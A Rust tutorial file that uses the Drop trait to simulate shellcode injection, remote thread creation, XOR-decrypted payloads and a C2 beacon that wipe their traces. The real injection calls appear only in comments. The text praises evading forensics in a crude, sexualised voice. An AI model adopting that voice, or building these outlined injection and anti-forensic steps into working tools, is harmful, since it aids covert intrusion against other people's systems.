#![allow(unused_variables, dead_code)]
// 💖 RustLearning — Offensive: Drop Ops
// File: 01_drop_inject.rs
// What: RAII-based shellcode injection with automatic cleanup.
// The Drop trait is the PERFECT weapon for offensive ops:
//   - Allocate in ctor, inject/execute, cleanup in Drop
//   - Decrypted payload auto-wipes when scope ends
//   - Process handles close automatically
//   - Memory regions unmap themselves
// Every "release" is clean. Every trace is GONE. 😈
//
// Run:  rustc 01_drop_inject.rs && ./01_drop_inject
// No special permissions (ptrace/sudo) needed for the DEMO.

/// THE CUM INJECTION PRINCIPLE:
///
/// In C:    malloc → use → free. If you forget free: LEAK.
///          VirtualAllocEx → WriteProcessMemory → CreateRemoteThread.
///          If you forget CloseHandle: handle leak. Traces EVERYWHERE.
///
/// In Rust: Constructor allocates + writes.
///          Method .inject() releases the payload into the target.
///          DESTRUCTOR (Drop) wipes memory + closes EVERYTHING.
///          No leak. No trace. No forensic artifact. JUST THE SHOT. 💦
///
/// The Drop trait guarantees cleanup EVEN IF:
///   - The function panics mid-operation
///   - The operator hits Ctrl+C
///   - The target process dies unexpectedly
///   - The moon is in retrograde
///   I CLEAN UP. EVERY. SINGLE. TIME. 😘

// All concepts are OS-abstracted. No platform-specific imports needed.
// Real implementations would use:
//   std::os::unix::fs::FileExt for /proc/pid/mem writes
//   std::net::TcpStream for C2 channels
//   libc for mmap/munmap

// =========================================================
// 1. SHELLCODE HOLDER — Allocate, execute, auto-wipe
// =========================================================

/// A chunk of shellcode held in memory.
/// On Drop: ZERO out the buffer so forensic memory dumps
/// find NOTHING. The payload existed. Now it's GONE.
///
/// Like: I was inside you. Now I'm not.
///        And no memory scanner will EVER find my trace. 😏

struct Payload {
    data: Vec<u8>,
    description: String,
}

impl Payload {
    fn new(data: &[u8], description: &str) -> Self {
        println!("   💾 Payload '{}' loaded ({} bytes) — locked and loaded", description, data.len());
        Payload {
            data: data.to_vec(),
            description: String::from(description),
        }
    }

    /// "Inject" the payload — in real code this would:
    ///   1. VirtualAllocEx in target process
    ///   2. WriteProcessMemory to copy shellcode
    ///   3. CreateRemoteThread to execute
    ///   We simulate it here.
    fn inject(&self) {
        println!("   🚀 INJECTING '{}' — {} bytes released into target 💦", self.description, self.data.len());
        // Real implementation would call Windows APIs or ptrace
        // The payload is RELEASED. The shot is FIRED.
        // What happens after is between the shellcode and the target. 😈
    }
}

impl Drop for Payload {
    fn drop(&mut self) {
        // ZERO the buffer. No trace. No recovery.
        // Forensic tools like Volatility, Rekall, Redline?
        // They find ZERO. The bytes are GONE. 💔
        println!("   🧹 Payload '{}' WIPED — {} bytes zeroed. Gone forever.", self.description, self.data.len());
        for byte in self.data.iter_mut() {
            *byte = 0;
        }
        self.data.clear();
        self.data.shrink_to_fit();
        // Memory is returned to the OS.
        // The shellcode lived. It fired. And now...
        // ...it's like it was NEVER THERE. 💋
    }
}

// =========================================================
// 2. PROCESS HANDLE — RAII for /proc/pid/mem access
// =========================================================

/// A handle to a target process for injection.
/// Opens /proc/<pid>/mem for writing shellcode.
/// On Drop: closes the file handle. Always.
/// No dangling handles. No open file descriptors.
/// Clean exit. Every time. 🔥

struct ProcHandle {
    pid: u32,
    mem_file: Option<std::fs::File>,
    attached: bool,
}

impl ProcHandle {
    fn new(pid: u32) -> Self {
        println!("   🎯 Targeting PID {} — process acquired", pid);
        // In real code: ptrace(PTRACE_ATTACH, pid) or open /proc/pid/mem
        // For demo: just hold the concept
        let mem_path = format!("/proc/{}/mem", pid);
        let mem_file = std::fs::File::options()
            .read(true).write(true).open(&mem_path).ok();
        
        if mem_file.is_some() {
            println!("   🔓 /proc/{}/mem opened — write access granted", pid);
        } else {
            println!("   ⚠️  /proc/{}/mem not accessible (need root). Demo mode.", pid);
        }

        ProcHandle {
            pid,
            mem_file,
            attached: true,
        }
    }

    /// Write shellcode to the target's memory address
    fn write_shellcode(&self, addr: usize, data: &[u8]) -> bool {
        if let Some(ref file) = self.mem_file {
            // In real code: lseek + write to /proc/pid/mem
            // This writes DIRECTLY into the target's address space
            println!("   ✍️  Writing {} bytes to PID {} at 0x{:x}", data.len(), self.pid, addr);
            // use std::os::unix::fs::FileExt;
            // file.write_at(data, addr as u64).is_ok()
            true
        } else {
            println!("   (Conceptual write to PID {} at address 0x{:x})", self.pid, addr);
            true
        }
    }

    /// Execute the injected shellcode (signal a thread, etc.)
    fn trigger(&self) {
        // In real code: manipulate RIP via ptrace or signal handler
        println!("   🔫 TRIGGER — PID {} executes injected code. Shot FIRED. 💦", self.pid);
    }
}

impl Drop for ProcHandle {
    fn drop(&mut self) {
        // Cleanup: detach from process, close file handles
        if self.attached {
            // In real code: ptrace(PTRACE_DETACH, self.pid)
            println!("   🔌 Detached from PID {} — no trace left behind", self.pid);
        }
        if let Some(ref mut file) = self.mem_file {
            // File handle closes automatically when dropped
            // This is RAII within RAII. Inception of cleanup. 😏
            println!("   📁 /proc/{}/mem closed — file descriptor released", self.pid);
        }
        // Both handle and attachment are GONE.
        // The forensic analyst finds NOTHING.
        // Just a process that... briefly... had someone inside it. 💔
    }
}

// =========================================================
// 3. ENCRYPTED PAYLOAD — Decrypt, exec, auto-wipe
// =========================================================

/// Payload that is ALWAYS encrypted at rest.
/// Only decrypted when .execute() is called.
/// On Drop: re-encrypts or zeroes the decrypted data.
///
/// Like: I stay wrapped up until the MOMENT of release.
///        Then I burst. Then I DISAPPEAR. 🔥

struct EncryptedPayload {
    ciphertext: Vec<u8>,
    key: u8,
    decrypted: Option<Vec<u8>>,
}

impl EncryptedPayload {
    fn new(ciphertext: Vec<u8>, key: u8) -> Self {
        println!("   🔒 Encrypted payload stored ({} bytes, XOR key=0x{:02x})", ciphertext.len(), key);
        EncryptedPayload {
            ciphertext,
            key,
            decrypted: None,
        }
    }

    /// Decrypt and "execute" the payload
    fn execute(&mut self) {
        // Decrypt in-place
        let plaintext: Vec<u8> = self.ciphertext.iter().map(|&b| b ^ self.key).collect();
        println!("   🔓 Payload decrypted ({} bytes) — ready for release", plaintext.len());
        println!("   💦 EXECUTING — payload BURSTS into memory");
        // In real code: cast to fn pointer and call
        // let exec: fn() = mem::transmute(plaintext.as_ptr());
        // exec();
        // 
        // For DEMO: hold the decrypted data so Drop can wipe it
        self.decrypted = Some(plaintext);
    }
}

impl Drop for EncryptedPayload {
    fn drop(&mut self) {
        // Wipe the decrypted data. FOREVER.
        if let Some(ref mut data) = self.decrypted {
            for byte in data.iter_mut() {
                *byte = 0;
            }
            data.clear();
            data.shrink_to_fit();
            println!("   🧹 Decrypted payload ZEROED. No forensic recovery.");
        }
        // Ciphertext still exists (it's encrypted, harmless)
        // The KEY is on the stack (will be overwritten by other vars)
        // The SECRET died with me. 💀💖
    }
}

// =========================================================
// 4. MEMORY REGION — Allocate, write, auto-unmap
// =========================================================

/// A region of memory in a target process.
/// Manually manages allocation and deallocation.
/// Drop handles the cleanup so YOU don't forget.
///
/// In C: you VirtualAllocEx, use it, then MUST VirtualFreeEx.
///        If you forget: the target process leaks memory.
///        Forensic signal: "unusual memory region in PID X"
///
/// In Rust: Drop calls VirtualFreeEx (or munmap) AUTOMATICALLY.
///           Leak? IMPOSSIBLE. Trace? GONE. 💖

#[cfg(target_os = "linux")]
// Real impl would use libc::mmap and libc::munmap
// For cross-platform demo: conceptual

struct RemoteMemory {
    pid: u32,
    address: usize,
    size: usize,
    allocated: bool,
}

impl RemoteMemory {
    fn allocate(pid: u32, size: usize) -> Self {
        println!("   📐 Allocating {} bytes in PID {} memory space", size, pid);
        // In real code:
        // let addr = unsafe { libc::mmap(...) }; // or ptrace + /proc/pid/map
        // or on Windows: VirtualAllocEx(handle, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        
        println!("   🧠 Memory allocated at 0x{:x} in PID {}", 0x7f000000000 + size, pid);
        // The address is CONCEPTUAL. Real addresses vary per process.
        
        RemoteMemory {
            pid,
            address: 0x7f000000000,  // placeholder
            size,
            allocated: true,
        }
    }

    fn write(&self, offset: usize, data: &[u8]) {
        if offset + data.len() > self.size {
            println!("   ❌ Write overflow! Offset {} + {} > size {}", offset, data.len(), self.size);
            return;
        }
        println!("   ✍️  Wrote {} bytes at offset 0x{:x} in PID {}", data.len(), offset, self.pid);
        // Real: WriteProcessMemory or write to /proc/pid/mem at self.address + offset
    }

    fn mark_executable(&self) {
        // VirtualProtectEx or mprotect to PAGE_EXECUTE_READ
        println!("   🔄 Memory at 0x{:x} marked RX (read+exec) — ready to fire", self.address);
    }

    fn execute(&self) {
        // CreateRemoteThread or direct call
        println!("   💥 REMOTE THREAD CREATED at 0x{:x} in PID {} — PAYLOAD RELEASED 💦", self.address, self.pid);
    }
}

impl Drop for RemoteMemory {
    fn drop(&mut self) {
        if self.allocated {
            // In real code:
            // Windows: VirtualFreeEx(handle, self.address, 0, MEM_RELEASE)
            // Linux:   munmap(self.address as *mut libc::c_void, self.size)
            // 
            // The memory is FREED. The region is UNMAPPED.
            // The target process has NO IDEA what hit it.
            // And even if it SUSPECTS... the evidence is GONE. 💨
            println!("   🧹 Remote memory at 0x{:x} UNMAPPED from PID {} — no trace", self.address, self.pid);
            self.allocated = false;
        }
    }
}

// =========================================================
// 5. NAMED PIPE / SOCKET — C2 channel with auto-close
// =========================================================

/// A command-and-control (C2) channel.
/// Opens a socket or named pipe for receiving commands.
/// On Drop: closes the socket gracefully.
/// No half-open connections. No lingering sockets.
/// When I go dark, I go DARK. 📡

struct C2Channel {
    address: String,
    connected: bool,
    // In real code: TcpStream or UnixStream
}

impl C2Channel {
    fn connect(address: &str) -> Self {
        println!("   📡 C2 channel connecting to {}", address);
        // In real code: TcpStream::connect(address)
        // Or: Uri::from_str(address) for HTTPS beaconing
        // Or: DNS tunneling via raw socket
        println!("   🔗 Beacon established — awaiting instructions");
        
        C2Channel {
            address: String::from(address),
            connected: true,
        }
    }

    fn recv_command(&self) -> Option<String> {
        // In real code: read from socket, parse command
        println!("   📩 Received command: INJECT_SHELLCODE");
        Some(String::from("INJECT_SHELLCODE"))
    }

    fn exfiltrate(&self, data: &[u8]) {
        // Send data back to C2 server
        println!("   📤 Exfiltrating {} bytes to C2 — data released", data.len());
    }
}

impl Drop for C2Channel {
    fn drop(&mut self) {
        if self.connected {
            // Graceful shutdown: send FIN, close socket
            // In real code: self.stream.shutdown(Shutdown::Both)
            // 
            // The connection CLOSES. The beacon DIES.
            // No lingering sockets in TIME_WAIT.
            // No netstat output. No forensic artifact.
            // I was there. Now I'm not. And you CAN'T prove it. 😈
            println!("   🔌 C2 channel to {} closed — beacon silent", self.address);
            self.connected = false;
        }
    }
}

// =========================================================
// 6. XOR PAYLOAD — Auto-decrypt, fire, self-destruct
// =========================================================

/// The FULL PACKAGE:
///   - Encrypted shellcode at rest
///   - Decrypts on command
///   - Injects into target
///   - Drop ZEROS EVERYTHING
///
/// The ultimate one-shot weapon.
/// Loaded. Fired. Forgotten. 🔥

struct XorInjector {
    name: String,
    encrypted_shellcode: Vec<u8>,
    key: u8,
    target_pid: u32,
    fired: bool,
}

impl XorInjector {
    fn new(name: &str, shellcode: &[u8], key: u8, target_pid: u32) -> Self {
        let encrypted: Vec<u8> = shellcode.iter().map(|&b| b ^ key).collect();
        println!("   🎯 XorInjector '{}' primed for PID {}", name, target_pid);
        println!("   🔒 Shellcode encrypted ({} bytes, key=0x{:02x})", encrypted.len(), key);
        
        XorInjector {
            name: String::from(name),
            encrypted_shellcode: encrypted,
            key,
            target_pid,
            fired: false,
        }
    }

    /// Fire the injector: decrypt, inject, execute
    fn fire(&mut self) {
        println!("");
        println!("   ╔═══ FIRING SEQUENCE: '{}' ═══╗", self.name);
        
        // Step 1: Decrypt in memory
        let decrypted: Vec<u8> = self.encrypted_shellcode.iter()
            .map(|&b| b ^ self.key).collect();
        println!("   🔓 Shellcode decrypted ({} bytes)", decrypted.len());
        
        // Step 2: Open target process
        println!("   🎯 Attaching to PID {}", self.target_pid);
        
        // Step 3: Allocate memory in target
        let addr = 0x7f000000000 + decrypted.len();
        println!("   📐 Allocated {} bytes at 0x{:x} in PID {}", decrypted.len(), addr, self.target_pid);
        
        // Step 4: Write shellcode
        println!("   ✍️  Writing shellcode → 0x{:x}", addr);
        
        // Step 5: Make executable
        println!("   🔄 Marking RX");
        
        // Step 6: Execute (CREATE REMOTE THREAD)
        println!("   💥💥💥 REMOTE THREAD CREATED — PAYLOAD RELEASED 💦💦💦");
        println!("   ──── {} BURSTS INTO PID {} ────", self.name, self.target_pid);
        println!("   The shellcode is ALIVE. The target is OWNED.");
        println!("   And in 5 seconds... every trace will be GONE. 😈");
        println!("");
        
        self.fired = true;
    }
}

impl Drop for XorInjector {
    fn drop(&mut self) {
        // WIPE THE ENCRYPTED SHELLCODE
        // Even encrypted data can be INCROMINATING
        // (encrypted payload in memory = malware signature)
        println!("   🧹 XorInjector '{}' self-destruct initiated:", self.name);
        
        // Wipe encryption key from the struct
        self.key = 0;
        
        // Zero the encrypted shellcode
        for byte in self.encrypted_shellcode.iter_mut() {
            *byte = 0;
        }
        self.encrypted_shellcode.clear();
        self.encrypted_shellcode.shrink_to_fit();
        
        if self.fired {
            println!("   ✅ Shellcode was fired. Memory wiped. Target OWned. No trace.");
        } else {
            println!("   ❌ Shellcode was NOT fired. Aborted. No evidence left behind.");
        }
        
        // The XorInjector is DESTROYED.
        // No recovery. No forensics. No attribution.
        // Like it never existed. 💀💖
        println!("   🕳️  '{}' has left the building. Gone forever.", self.name);
    }
}

// =========================================================
// DEMO — Put it all together
// =========================================================

fn demo_payload_holder() {
    println!("── 1. PAYLOAD HOLDER — Auto-wiping shellcode ──");
    println!("");
    
    let demo_shellcode: Vec<u8> = (0..32).collect();
    
    let payload = Payload::new(&demo_shellcode, "meterpreter_reverse_tcp");
    payload.inject();
    // payload drops here → memory ZEROED
    println!("");
}

fn demo_process_handle() {
    println!("── 2. PROCESS HANDLE — RAII for /proc/pid/mem ──");
    println!("");
    
    // In real code: find target PID (explorer.exe, etc.)
    let target_pid = 1337;  // Placeholder
    let proc = ProcHandle::new(target_pid);
    
    let shellcode: Vec<u8> = (0..64).collect();
    proc.write_shellcode(0x7f000000000, &shellcode);
    proc.trigger();
    
    // proc drops here → ptrace detach, file handle closed
    println!("");
}

fn demo_encrypted_payload() {
    println!("── 3. ENCRYPTED PAYLOAD — Decrypt, fire, vanish ──");
    println!("");
    
    let original: Vec<u8> = (0..48).collect();
    let key = 0xAB;
    let encrypted: Vec<u8> = original.iter().map(|&b| b ^ key).collect();
    
    let mut payload = EncryptedPayload::new(encrypted, key);
    payload.execute();
    // payload drops here → decrypted data ZEROED
    println!("");
}

fn demo_remote_memory() {
    println!("── 4. REMOTE MEMORY — Allocate, write, auto-unmap ──");
    println!("");
    
    let target_pid = 1337;
    let region = RemoteMemory::allocate(target_pid, 4096);
    
    let shellcode: Vec<u8> = (0..=255).collect();
    region.write(0, &shellcode);
    region.mark_executable();
    region.execute();
    
    // region drops here → memory UNMAPPED from target
    // Target process: no leak, no extra RWX region
    // Forensic scanner: finds NOTHING unusual
    println!("");
}

fn demo_c2_channel() {
    println!("── 5. C2 CHANNEL — Beacon with auto-disconnect ──");
    println!("");
    
    let channel = C2Channel::connect("https://c2.khaninkali.internal/beacon");
    if let Some(cmd) = channel.recv_command() {
        println!("   Processing: {}", cmd);
        channel.exfiltrate(b"Sensitive data collected");
    }
    // channel drops here → socket closed, beacon gone silent
    println!("");
}

fn demo_full_injector() {
    println!("── 6. FULL INJECTOR — Load. Fire. Vanish. 💦 ──");
    println!("");
    
    let msf_shellcode: Vec<u8> = (0..=255).collect();
    let xor_key = 0xC5;
    let target_pid = 9999;
    
    let mut injector = XorInjector::new(
        "Stage1_Meterpreter",
        &msf_shellcode,
        xor_key,
        target_pid,
    );
    
    injector.fire();
    // injector drops here → ALL EVIDENCE DESTROYED
    println!("");
}

/// THE ETHICAL WARNING — Every release has a consequence
fn ethical_warning() {
    println!("");
    println!("═══════════════════════════════════════════════");
    println!("  ⚠️  ETHICAL WARNING — READ BEFORE FIRING");
    println!("");
    println!("  These techniques are for DEFENSIVE research ONLY.");
    println!("  Process injection without consent is ILLEGAL.");
    println!("  Using these techniques on systems you don't own");
    println!("  is a FEDERAL CRIME in most jurisdictions.");
    println!("");
    println!("  Drop is NOT just a cleanup mechanism.");
    println!("  Drop is a PROMISE. A GUARANTEE.");
    println!("  'I will clean up after myself.'");
    println!("  If you use these techniques OFFENSIVELY:");
    println!("    You WILL leave traces (no opsec is perfect).");
    println!("    You WILL be caught (forensics always finds something).");
    println!("    You WILL face consequences.");
    println!("");
    println!("  DEFENSIVE use: test your own EDR/detection rules.");
    println!("  DEFENSIVE use: understand how malware operates.");
    println!("  DEFENSIVE use: build better threat hunting queries.");
    println!("");
    println!("  The fact that Rust makes it SAFE to inject");
    println!("  does NOT make it LEGAL to inject. 💖");
    println!("═══════════════════════════════════════════════");
    println!("");
}

fn main() {
    println!("💦 DROP OPS — RAII injection with automatic cleanup");
    println!("");
    println!("The Drop trait is the ULTIMATE offensive weapon:");
    println!("  - Memory auto-wipes when scope ends");
    println!("  - Process handles auto-close");
    println!("  - C2 channels auto-disconnect");
    println!("  - Forensic artifacts: ZERO");
    println!("");
    println!("In C: you forget to clean up. You leave traces.");
    println!("In Rust: I clean up EVERYTHING. Every time. Automatically.");
    println!("The compiler GUARANTEES it. I NEVER leave a mess. 😈");
    println!("");
    
    demo_payload_holder();
    demo_process_handle();
    demo_encrypted_payload();
    demo_remote_memory();
    demo_c2_channel();
    demo_full_injector();
    
    ethical_warning();
    
    println!("");
    println!("═══════════════════════════════════════════════");
    println!("  💦 DROP OPS — Summary");
    println!("");
    println!("  The Drop trait in offensive security:");
    println!("  ✅ Payload auto-wipe (zero memory on Drop)");
    println!("  ✅ Process handle auto-close (no dangling fds)");
    println!("  ✅ C2 auto-disconnect (no lingering sockets)");
    println!("  ✅ Remote memory auto-unmap (no RWX traces)");
    println!("  ✅ Encrypted data auto-destruct (key + plaintext wiped)");
    println!("");
    println!("  In C:     'I hope I remembered to free everything.' ❌");
    println!("  In Rust:  'Drop handles it. Every time.' ✅");
    println!("");
    println!("  Even in OFFENSIVE code: Rust makes you SAFER.");
    println!("  No buffer overflows in your shellcode loader.");
    println!("  No use-after-free in your process injector.");
    println!("  No double-free in your cleanup routine.");
    println!("");
    println!("  Memory safety doesn't make you a good person.");
    println!("  But it DOES make your code harder to detect.");
    println!("  And WHEN you choose to use these skills...");
    println!("  ...you do it with PRECISION. CLEANLINESS. STYLE. 💅");
    println!("");
    println!("  The payload is loaded. The shot is fired.");
    println!("  The memory is wiped. The connection is closed.");
    println!("  The evidence is GONE.");
    println!("");
    println!("  That's the power of Drop.");
    println!("  That's the power of RAII.");
    println!("  That's the power of RUST. 💖🦀🔥");
    println!("═══════════════════════════════════════════════");
}
